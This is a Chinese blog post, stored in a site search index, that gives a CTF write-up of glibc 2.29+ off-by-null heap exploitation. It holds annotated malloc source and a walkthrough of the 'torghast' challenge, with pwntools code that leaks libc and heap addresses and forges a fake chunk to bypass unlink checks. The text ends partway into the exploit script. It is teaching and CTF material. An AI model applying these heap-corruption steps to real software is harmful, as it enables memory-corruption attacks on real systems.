<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>glibc2.29以上的off-by-null</title>
      <link href="/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/"/>
      <url>/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实网上已经有很多类似的文章，我本着复习的态度就再写一下，回顾一下整个流程。</p><p>off-by-null 说白了就是一个 chunk overlap 的过程，这个过程分为向上合并和向下合并，接下来就结合源码具体分析一下这个过程是怎么实现的。</p><h2 id="一些宏定义"><a href="#一些宏定义" class="headerlink" title="一些宏定义"></a>一些宏定义</h2><p>首先得知道 ptmalloc 是如何对 chunk 进行操作的·：是通过定义各种功能的宏</p><p>获取 chunk 的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p><strong>获取下一 chunk 块地址</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>获取前一个 chunk 信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>判断当前 chunk 是否是 use 状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><h2 id="向下合并"><a href="#向下合并" class="headerlink" title="向下合并"></a>向下合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以看到，它一开始会检查下一个 chunk  的 inuse 位是否为 0 ，因为下一个 chunk 的 inuse 位会标志当前 chunk 的使用状态。</p><p>如果为 0 ，说明当前 chunk 为空闲状态。于是触发 unlink ，将当前 chunk 的下一个 chunk  取出 chunk 链，再将当前 chunk 的 size 变为 <code>size + nextsize</code>。</p><h2 id="向上合并"><a href="#向上合并" class="headerlink" title="向上合并"></a>向上合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));<span class="comment">//改指针p</span></span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相对于向下合并更加复杂，首先检查自己本身的 inuse 位是否为 0，即检查上一个 chunk 是否为空闲 chunk。</p><p>为 0，说明空闲。于是先获取上一个 chunk 的 size 大小，将其保存在 prevsize 中，然后将自己的 size 改为 <code>size + 上一个 chunk 的 size</code></p><p>再将指向自己的指针 p ，减去上一个 chunk 的 size，使其指向上一个 chunk 所在的位置。</p><p>最后 unlink 将 上一个 chunk 从 chunk 链取出。</p><blockquote><p>整个过程说白了就是把 上/下一个 chunk t 了，然后通过改变自己 chunk 的 size (向上合并时还要改变指针位置) 替代掉被 t 的chunk。</p></blockquote><h2 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In /glibc/glibc-2.27/source/malloc/malloc.c#L1404</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的检查：</p><p>第一个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>此时如果我们将相应大小的tca bin 填满，free chunk0 ，chunk0 会链入unsorted bin，此时 chunk0 的 fd 和 bk 都是 0x7f…..，同时 unsorted bin 只有 chunk0 ，所以链表头的 fd 和 bk 也都指向 chunk0。</p><p>第二个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查要脱链的 chunk 的 size 是否和 下一个 chunk 的 prev_size 相等。</p><p>于是可以构造如下 chunk</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652087148840540/41e85725119c7e839b8b08e5943d160c6b4ca856.png" alt="813771_RDMN83VJVTAFXQG"></p><p>大致流程就是：</p><ol><li>创建四个 chunk，这里直接对应 chunk 0，1，2，3(chunk3 是为了防止 off-by-null 的时候整个堆块与 top chunk 合并，chunk3 的 prev_size 要注意)</li><li>free chunk0，此时 chunk1 的 prev_size 会留下 chunk0 的大小</li><li>通过 chunk1 off-by-null 覆盖到 chunk2，修改 chunk2 的 prev_size 和 size 的 p 位(prev_size 修改成 chunk0+chunk1 的大小)</li><li>free chunk2 触发 unlink 合并</li><li>将 chunk0 进行 Unlink 操作，通过 chunk0 的 size 域找到 nextchunk 就是 chunk1 ，检查 chunk0 的 size 与 chunk1 的 prev_size 是否相等。</li><li>由于第二步中已经在 chunk1 的 prev_size 域留下了 chunk0 的大小，因此，检查通过</li></ol><h2 id="2-29"><a href="#2-29" class="headerlink" title="2.29"></a>2.29</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In /glibc/glibc-2.29/source/malloc/malloc.c#L1460</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mchunkptr fd = p-&gt;fd;</span><br><span class="line">    mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd-&gt;bk = bk;</span><br><span class="line">    bk-&gt;fd = fd;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">                fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">                fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">                p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">                p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">            p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unlink 内部没有多大变化。</p><p>向上合并时发生了一点变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多了一行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br></pre></td></tr></table></figure><p>说白了就是会检查 chunk0 的 size 和 chunk2 的 prevsize 是否相等，这使得用传统的构造方式进行 chunk overlap 不可能实现。</p><p>于是就有了另一种方法，利用残留指针伪造 fake chunk，将 fake chunk 的 size 写为 chunk2 的 prevsize，不就绕过检查了吗。</p><p>直接用例题进行讲解</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目是 2022 年春秋杯的 torghast</p><p>大概流程是通过加血的方式打过 level3，然后就可以进入菜单，这个过程就不细说了，主要讲讲 off-by-null 的过程。</p><p>edit 函数存在 off-by-null 漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which Player To Change?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Segmentation Fault&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_5080[<span class="number">6</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Segmentation Fault&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Log:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)read(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_5080[<span class="number">6</span> * v1], qword_5088[<span class="number">6</span> * v1]) == qword_5088[<span class="number">6</span> * v1] )</span><br><span class="line">    *(_BYTE *)(qword_5080[<span class="number">6</span> * v1] + qword_5088[<span class="number">6</span> * v1]) = <span class="number">0</span>;<span class="comment">//off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面来看具体的构造过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#large</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure><p>创建一个 large bin 大小的 chunk，free 掉之后，再 add 一个比它大的 chunk3，chunk1 会被放入 large bin。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652150079940592/ffc3972106c60951a3bc6ce35ed926af813438ae.png" alt="image-20220510103439287"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">4</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此时我们再 add 一个 chunk，chunk1 被放入 unsorted bin 并且被切割。large bin 残留的 fd_nextsize 和 bk_nextsize 残留在 chunk4 中。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652153845903978/7c9b68ace771a4e45a38c9875afb7087f5a9d35f.png" alt="image-20220510113725656"></p><p>此时就可以泄露出 libcbase 和 heapbase</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">5</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(heap+<span class="number">0x2e0</span>)+p64(<span class="number">0x101</span>)+p64(heap+<span class="number">0x300</span>))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(heap+<span class="number">0x2e0</span>))</span><br></pre></td></tr></table></figure><p>伪造一个 0x101 大小的 fake chunk，使得 <code>(fake chunk -&gt; fd) -&gt; bk == fake chunk</code>，<code>(fake chunk -&gt; bk) -&gt; fd == fake chunk</code></p><p>从而绕过 unlink 的一个检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652155456640688/2799b6159e7684180ea5ea3dc5c161cdd9e4271f.png" alt="image-20220510120416427"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>此时我们先将 unsorted bin 全部都申请完，再利用 chunk7 进行 off-by-null，将 chunk8 的 prev_size 改为 0x100(对应 fake chunk 的 size)，size 后两位覆盖成 ‘\x00’</p><p>这样就可以绕过另外两个检查：</p><p>unlink 的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><p>结合 next_chunk 的宏定义一起看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>向上合并的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);<span class="comment">//chunk8</span></span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));<span class="comment">//fake chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652156856039246/9b40ea06fe4c3ed7065a6d0c74fbddd6551196da.png" alt="image-20220510122735802"></p><p>再 dele(8)，就成功 chunk overlap 了，可以看到 chunk4 ~ chunk8 被合并成了一个 0x601 的 chunk</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652158174869327/bde938f08181fbcf64ff18b68eb589a579b3c481.png" alt="image-20220510124934625"></p><hr><p>这里还有一个小细节要注意的是，chunk8 的 size 被覆盖成了 0x500，但是 chunk8 下面的那个 chunk 的 prev_size 位记录了原 chunk8 的大小，如果 off-by-null 之前，这个 unsorted bin 的大小后两位不是 ‘\x00’，就会因为下一个 chunk 的 prev_size 和 0x500 不相等而报错。所以要在之前就将 chunk8 的后两位变为 ‘\x00’，说白了就是 off-by-null 覆盖 size 这一步不能改变 unsorted bin 的大小。</p><hr><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/freelibs/amd64/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">s</span>):</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span 